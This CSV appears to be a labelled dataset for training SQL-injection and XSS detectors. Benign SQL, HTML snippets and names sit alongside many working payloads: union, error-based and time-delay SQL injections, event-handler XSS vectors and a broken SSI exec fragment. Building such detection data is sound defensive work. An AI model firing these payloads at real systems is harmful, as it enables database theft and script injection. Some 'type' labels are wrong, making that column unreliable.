Text,Label,type
SELECT * FROM shinning WHERE remarkable = 'hung' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT COUNT ( we ) FROM balance,0,sql
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,1,sql
"<embed onmouseup=""alert(1)"">test</embed>",2,xss
"   SELECT locate,suit,material,nearer,fall     (  (  or JOIN halfway ON signal.image =  am.write )   INNER JOIN favoriteON Orders.is =  these.thinkID ) ",0,sql
"<li><a href=""/wiki/Mental_property"" title=""Mental property"">Mental property </a> </li>",0,xss
l655a2uta,0,sql
"<article onbeforecut=""alert(1)"" contenteditable>test</article>",2,xss
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,sql
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1,xss
84446214n,0,sql
SELECT AVG ( cat )  FROM traffic  SELECT SUM ( percent ) ,0,sql
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1,sql
"<li id=""cite_note-AI_in_the_80s-10""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-AI_in_the_80s_10-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_the_80s_10-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_the_80s_10-2""><sup><i><b>c </b> </i> </sup> </a> ",0,xss
"Pamela <a href=""#CITEREFMcCorduck2004"">McCorduck (2004 </a>, pp.&#160;424) writes of ""the rough shattering of AI in subfields—vision, natural language, decision theory, genetic algorithms, robotics&#160;... and these with own sub-subfield—that would hardly have anything to say to each other."" ",0,xss
SELECT   LOCALTIME (  )  + 1;,0,sql
SELECT steady ( s )  FROM felt LEFT JOIN,0,sql
"""><img src=""x:x"" onerror=""alert()"">",2,xss
"c/ zumalacarregui 87,",0,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1,sql
-7435'  )   where 6242  =  6242 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,xss
SELECT * FROM energy WHERE twelve NOT BETWEEN 'printed' AND 'accept',0,xss
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,1,sql
SELECT * FROM depth WHERE being NOT LIKE 'himself%',0,sql
SELECT character,0,xss
72ic5oid4,0,sql
"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5940 )  ORDER BY meta_id ASC",0,sql
"<rp onmouseup=""alert(1)"">test</rp>",2,xss
<sup id=x tabindex=1 onactivate=alert(1)></sup>,2,xss
"<s onpaste=""alert(1)"" contenteditable>test</s>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",0,xss
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sql
<a id=x tabindex=1 onfocus=alert(1)></a>,2,xss
SELECT AVG ( specific ) FROM elephant,0,xss
SELECT * FROM fought WHERE silent = 'shorter'  OR north = 'affect',0,sql
"Moving and <a href=""/wiki/Configuration_space_(physics)"" title=""Configuration space (physics)"">configuration space </a>:",0,xss
"<meter onmouseleave=""alert(1)"">test</meter>",2,xss
<input3 onpointerdown=alert(1)>XSS</input3>,2,xss
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,1,sql
SELECT COUNT ( DISTINCT flight )  FROM neighbor,0,sql
12785855v,0,sql
"1 and elt  (  8853  =  1675,1675  )  -- jegm",1,xss
giuliani casabella,0,sql
"-7939""  )   or 3958  =  6909",1,sql
chistiakov@zytechwind.ke,0,sql
canela,0,xss
"  SELECT whomID AS ID, careful AS darkness FROM mountain",0,sql
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,xss
"<del onmouseenter=""alert(1)"">test</del>",2,xss
	 </span> </li>,0,xss
SELECT * FROM are FETCH FIRST 3 ROWS ONLY,0,sql
walberg@ytv.com.gn,0,sql
"<style>:target {color: red;}</style><s id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></s>",2,xss
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1,sql
FROM  ( SELECT DISTINCT pitch FROM exciting ) ,0,xss
 </p>,0,xss
SELECT AVG ( party ) FROM apart SELECT SUM ( dish ) ,0,sql
"<ins onmousedown=""alert(1)"">test</ins>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>",2,xss
"<figure onmouseout=""alert(1)"">test</figure>",2,xss
"pl. cantarranillas 21,",0,sql
1  )   and   (  3020  =  3020  )  *6703 and   (  9831  =  9831,1,sql
SELECT * FROM shoe FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT * FROM entire FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<slot onmouseenter=""alert(1)"">test</slot>",2,xss
saint-simon-vondis@paremoselalzheimer.dj,0,sql
"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>",2,xss
SELECT * FROM put  WHERE yet = exchange,0,sql
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  8450  =  8450",1,sql
1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||',1,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367653 ) ,0,sql
18513875w,0,sql
SELECT TOP 3 * FROM silly SELECT * FROM pull 3SELECT * FROM station,0,xss
1' where 5778  =  5778,1,sql
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",2,xss
"<th oncopy=""alert(1)"" contenteditable>test</th>",2,xss
striebeck.magnuson@alpesfranceses.com.im,0,sql
"			<div class=""thumbcaption"">",0,xss
SELECT * FROM definition,0,sql
"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",1,sql
SELECT AVG ( found ) FROM ready,0,sql
SELECT hang,0,xss
-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,1,xss
"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;235–248 </li> </ul>",0,xss
SELECT AVG ( six ) FROM join SELECT SUM ( attention ) ,0,sql
SELECT * FROM market WHERE road = 'long' LIMIT 3,0,sql
SELECT * FROM golden WHERE plus NOT BETWEEN 'sister' AND 'ship',0,sql
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,xss
"<a href=""/wiki/Bayesian_decision_theory"" class=""mw-redirect"" title=""Bayesian decision theory"">Bayesian decision theory </a> and Bayesian <a href=""/wiki/Decision_network"" class=""mw-redirect"" title=""Decision network"">decision networks </a>:",0,xss
"1  )   where 9829  =  9829 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
1'+  (  select idnb where 2338  =  2338,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">maschafilm. <a rel=""nofollow"" class=""external text"" href=""http://www.plugandpray-film.de/en/content.html"">""Content: Plug &amp; Pray Film – Artificial Intelligence – Robots -"" </a>. <i>plugandpray-film.de </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160212040134/http://www.plugandpray-film.de/en/content.html"">Archived </a> from the original on 12 February 2016. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=plugandpray-film.de&amp;rft.atitle=Content%3A+Plug+%26+Pray+Film+%E2%80%93+Artificial+Intelligence+%E2%80%93+Robots+-&amp;rft.au=maschafilm&amp;rft_id=http%3A%2F%2Fwww.plugandpray-film.de%2Fen%2Fcontent.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<bgsound onpointermove=alert(1)>XSS</bgsound>,2,xss
SELECT COUNT ( characteristic ) FROM shorter,0,sql
"<output onkeypress=""alert(1)"" contenteditable>test</output>",2,xss
	 </span> </h3>,0,xss
beom-sah,0,sql
SELECT * FROM spider WHERE express = 'improve'  AND  ( wonderful = 'battle' OR gradually = 'west' ) ,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  # aetd",1,sql
p6lma13isti,0,sql
60578448j,0,sql
 </p>,0,xss
SELECT swing ( s )  FROM whatever UNION ALL,0,sql
-4595'  )   where 4892  =  4892 order by 1--,1,sql
"INSERT INTO column ( white, does, certain, curious, first, our )  VALUES  ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )  ",0,sql
"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
walter,0,sql
<fieldset onpointerover=alert(1)>XSS</fieldset>,2,xss
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq",1,xss
8.3888E+15,0,sql
 </li>,0,xss
"<menu draggable=""true"" ondrag=""alert(1)"">test</menu>",2,xss
"   SELECT mind,numeral,than,exclaimed,known     (  (  guide JOIN coast ON snake.well =  magic.snake )   INNER JOIN entireON Orders.observe =  underline.viewID ) ",0,sql
"  SELECT milkID AS ID, at AS spin FROM object",0,sql
"-3817""  )   as vugz where 3064  =  3064 or 9323  =  9323#",1,sql
lareo robles,0,sql
"<progress draggable=""true"" ondragenter=""alert(1)"">test</progress>",2,xss
"1""  )   as aifd where 5962  =  5962",1,sql
"<param onkeyup=""alert(1)"" contenteditable>test</param>",2,xss
"</TITLE><SCRIPT>alert("""");</SCRIPT>",2,xss
"1  )   as kqas where 7302  =  7302 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>,2,xss
5.07682E+15,0,sql
SELECT * FROM service ORDER BY connected,0,sql
<nav onpointerenter=alert(1)>XSS</nav>,2,xss
SELECT stronger ( s )  FROM machine SELECT proud ( s ) ,0,sql
	 </span> 2018 ,0,xss
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,sql
"  <form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0,xss
"  SELECT Orders.breadrID, Employees.mountain, Employees.compass FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.societyID ORDER BY Orders.vaporID",0,sql
SELECT COUNT ( facing )  FROM gray,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Unhuman%3A+Art+in+the+Age+of+AI+%E2%80%93+State+Festival&amp;rft.pub=Statefestival.org&amp;rft_id=https%3A%2F%2Fwww.statefestival.org%2Fprogram%2F2017%2Funhuman-art-in-the-age-of-ai&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Steve_Omohundro"" title=""Steve Omohundro"">Steve Omohundro </a> </li>",0,xss
jamaly,0,xss
"<span onclick=""alert(1)"">test</span>",2,xss
nacer,0,sql
SELECT AVG ( everywhere ) FROM acres SELECT SUM ( mistake ) ,0,sql
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/benchmarking.html"">Benchmarking</a></li>",0,xss
"<li id=""cite_note-FOOTNOTEMcCorduck2004480–483-44""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEMcCorduck2004480–483_44-0"">^ </a> </b> ",0,xss
 UPDATE above SET try = 'stand'WHERE silly = 'society',0,sql
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'sstt'  =  'sstt",1,sql
"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",2,xss
	 </span> 2011 ,0,xss
"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1,sql
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc,1,xss
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""ilrk""  =  ""ilrk",1,xss
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ) ,0,sql
"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",1,sql
1'+  (  select 'unpz' where 8186  =  8186,1,sql
97060354d,0,sql
"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",1,sql
"SELECT * FROM meat WHERE powerful BETWEEN ""operation"" AND    ""knife""",0,sql
1 where 7802  =  7802,1,sql
"<form onpaste=""alert(1)"" contenteditable>test</form>",2,xss
1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
a7p9i9bl2,0,sql
1'  )   where 4509  =  4509 union all select null--,1,sql
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",2,xss
"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
macoosh3,0,sql
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",2,xss
"-8205' or elt  (  6581  =  3480,3480  )   and 'sosv'  =  'sosv",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9053 )  ORDER BY meta_id ASC",0,sql
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,xss
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>,2,xss
SELECT * FROM instant WHERE forgotten LIKE '%third%',0,xss
 UPDATE express SET several = 'young'WHERE route = 'paper',0,sql
<kbd id=x tabindex=1 onactivate=alert(1)></kbd>,2,xss
"	 <div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em;"">",0,xss
"<isindex onbeforecopy=""alert(1)"" contenteditable>test</isindex>",2,xss
-8341 or 8571  =  8571--,1,sql
"<li><a href=""/wiki/Automated_restaurant"" title=""Automated restaurant"">Food service </a> </li>",0,xss
"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
<p>,0,xss
"<li><a href=""/wiki/File:Socrates.png"" class=""image""><img alt=""Socrates.png"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png"" decoding=""async"" width=""18"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x"" data-file-width=""326"" data-file-height=""500"" /> </a> <a href=""/wiki/Portal:Philosophy"" title=""Portal:Philosophy"">Philosophy&#32;portal </a> </li> </ul>",0,xss
inofensiva,0,sql
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"	 <div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em;"">",0,xss
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1,sql
<textarea oncopy=alert(1) autofocus>XSS</textarea>,2,xss
 ,0,xss
select pg_sleep  (  5  )   and    (    (   '%'  =  ',1,sql
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,sql
	 </span>,0,xss
"<p>Early researchers developed algorithms that imitated step-by-step reasoning that humans use when they solve puzzles or make logical deductions.<sup id=""cite_ref-Reasoning_88-0"" class=""reference""><a href=""#cite_note-Reasoning-88"">&#91;85&#93; </a> </sup> By the late 1980s and 1990s, AI research had developed methods for dealing with <a href=""/wiki/Uncertainty"" title=""Uncertainty"">uncertain </a> or incomplete information, employing concepts from <a href=""/wiki/Probability"" title=""Probability"">probability </a> and <a href=""/wiki/Economics"" title=""Economics"">economics </a>.<sup id=""cite_ref-Uncertain_reasoning_89-0"" class=""reference""><a href=""#cite_note-Uncertain_reasoning-89"">&#91;86&#93; </a> </sup>",0,xss
"  UPDATE needle SET draw =  'zoo', City =  'wealth' WHERE fill =  relationship",0,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   '%'  =  '",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://nextbigwhat.com/ai-traffic-signals-to-be-installed-in-bengaluru-soon/"">""AI traffic signals to be installed in Bengaluru soon"" </a>. <i>NextBigWhat </i>. 24 September 2019<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">1 October ",0,xss
"  SELECT islandID AS ID, skin AS because FROM thousand",0,sql
SELECT Count ( * )  AS silver,0,sql
SELECT your FROM natural,0,sql
" SELECT * FROM swept ORDER BY beginning, including",0,sql
"<p><a href=""/wiki/Logic"" title=""Logic"">Logic </a><sup id=""cite_ref-Logic_194-0"" class=""reference""><a href=""#cite_note-Logic-194"">&#91;190&#93; </a> </sup> is used for knowledge representation and problem solving, but it can be applied to other problems as well. For example, the <a href=""/wiki/Satplan"" title=""Satplan"">satplan </a> algorithm uses logic for <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">planning </a><sup id=""cite_ref-Satplan_195-0"" class=""reference""><a href=""#cite_note-Satplan-195"">&#91;191&#93; </a> </sup> and <a href=""/wiki/Inductive_logic_programming"" title=""Inductive logic programming"">inductive logic programming </a> is a method for <a href=""/wiki/Machine_learning"" title=""Machine learning"">learning </a>.<sup id=""cite_ref-Symbolic_learning_techniques_196-0"" class=""reference""><a href=""#cite_note-Symbolic_learning_techniques-196"">&#91;192&#93; </a> </sup>",0,xss
"<style>:target {transform: rotate(180deg);}</style><listing id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></listing>",2,xss
4897,0,sql
yescas feal,0,sql
"-8477' union all select 2517,2517,2517--",1,sql
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=34"" title=""Edit section: Evaluating progress"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1,sql
"<!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js>",2,xss
	 </span>,0,xss
	 </span> </a> </li>,0,xss
1'||  (  select 'rjun' where 8868  =  8868 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1,sql
"-4168'  )   union all select 2618,2618#",1,sql
fresno de torote,0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFEdelson1991"">Edelson 1991 </a>. ",0,xss
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,xss
"  <link rel=""stylesheet"" href=""_static/css/tooltipster.custom.css"" type=""text/css"" />",0,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'xcxr' like 'xcxr",1,sql
 or '' ',1,sql
"<rt onmousedown=""alert(1)"">test</rt>",2,xss
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,sql
" SELECT column_name ( s )  FROM break,widely",0,sql
277,0,sql
"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",1,xss
7542,0,sql
SELECT AVG ( recently ) FROM government,0,xss
"<div draggable=""true"" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>",2,xss
"<li id=""cite_note-362""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-362"">^ </a> </b> ",0,xss
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",2,xss
3.89191E+15,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Artificial+Intelligence+at+Edinburgh+University%3A+a+Perspective&amp;rft.date=1994-11&amp;rft.aulast=Howe&amp;rft.aufirst=J.&amp;rft_id=http%3A%2F%2Fwww.inf.ed.ac.uk%2Fabout%2FAIhistory.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></title>",2,xss
 ,0,xss
"<th onkeyup=""alert(1)"" contenteditable>test</th>",2,xss
3.22773E+15,0,sql
"  (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,sql
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",2,xss
<sup onpointerenter=alert(1)>XSS</sup>,2,xss
"<li><a href=""/wiki/I._A._Richards"" title=""I. A. Richards"">I. A. Richards </a> </li>",0,xss
borriol,0,sql
log9era,0,sql
milani4@beautifulbody.sh,0,sql
"pobla tornesa, la",0,sql
" SELECT * FROM political ORDER BY main, practical",0,sql
"  SELECT protectionID AS ID, conversation AS plural FROM imagine",0,sql
"<colgroup onmouseover=""alert(1)"">test</colgroup>",2,xss
"1'  )   as lrif where 6525  =  6525 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""udlh""  =  ""udlh",1,xss
"  SELECT share,direct,what FROM without LEFT JOIN Orders ON appropriate.greatestID =  you.creature ORDER BY raise.mission",0,sql
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationend=""alert(1)""></picture>",2,xss
"<li><a href=""/wiki/Inductive_reasoning"" title=""Inductive reasoning"">Inductive reasoning </a> </li>",0,xss
"<li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0,xss
"<title onkeydown=""alert(1)"" contenteditable>test</title>",2,xss
<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>,2,xss
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
"   SELECT include, eaten, solidFROM die WHERE partly  IS NOT NULL",0,sql
"   SELECT COUNT ( report ) , throat FROM task BY speech",0,sql
<output onpointerleave=alert(1)>XSS</output>,2,xss
SELECT * FROM whistle WHERE strong IN  ( SELECT who FROM mysterious ) ,0,xss
1'  )   where 9516  =  9516,1,sql
SELECT * FROM  ( SELECT claws FROM moon ) ,0,sql
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",2,xss
"  SELECT * FROM behavior WHERE fur NOT IN  ( 'particles', 'term', 'boat' )  ",0,xss
"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1,sql
7092,0,sql
